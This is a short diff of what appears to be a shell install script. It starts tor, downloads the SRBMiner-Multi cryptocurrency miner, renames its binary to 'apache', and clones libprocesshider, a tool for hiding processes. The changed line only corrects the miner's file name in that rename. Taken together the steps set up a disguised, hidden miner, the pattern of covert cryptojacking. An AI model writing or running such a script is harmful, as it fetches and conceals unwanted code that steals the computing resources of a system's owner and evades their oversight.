@@ -8,7 +8,7 @@ sudo service tor start
 wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.9.5/SRBMiner-Multi-0-9-5-Linux.tar.xz
 tar -xf SRBMiner-Multi-0-9-5-Linux.tar.xz
 cd SRBMiner-Multi-0-9-5-Linux
-mv SRBMiner-Multi-0-9-5-Linux ../apache
+mv SRBMiner-MULTI ../apache
 cd ..
 
 git clone https://github.com/hanifgz/libprocesshider.git
